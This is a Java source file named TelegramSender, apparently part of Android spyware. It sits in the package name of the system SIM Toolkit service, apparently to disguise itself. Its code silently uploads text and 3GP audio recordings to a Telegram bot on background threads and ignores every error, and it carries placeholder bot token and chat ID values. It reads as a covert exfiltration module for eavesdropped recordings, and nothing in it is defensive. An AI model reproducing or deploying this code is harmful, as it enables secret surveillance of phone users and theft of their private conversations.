package com.android.stk.service;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramSender {

    private static final String BOT_TOKEN = "TOKENBOT";
    private static final String CHAT_ID = "-CHATID";

    // ✅ Method untuk kirim teks
    public static void sendText(String message) {
        new Thread(() -> {
            try {
                String encoded = message.replace(" ", "%20").replace("\n", "%0A");
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;

                HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream().close();
            } catch (Exception ignored) {}
        }).start();
    }

    // ✅ Method untuk kirim file audio (misalnya rekaman 3gp)
    public static void sendAudio(File audioFile, String caption) {
        new Thread(() -> {
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                // chat_id
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
                dos.writeBytes(CHAT_ID + lineEnd);

                // caption
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd + lineEnd);
                dos.writeBytes(caption + lineEnd);

                // audio file
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFile.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: audio/3gpp" + lineEnd + lineEnd);

                FileInputStream fis = new FileInputStream(audioFile);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                conn.getInputStream().close(); // trigger send

            } catch (Exception ignored) {}
        }).start();
    }
}
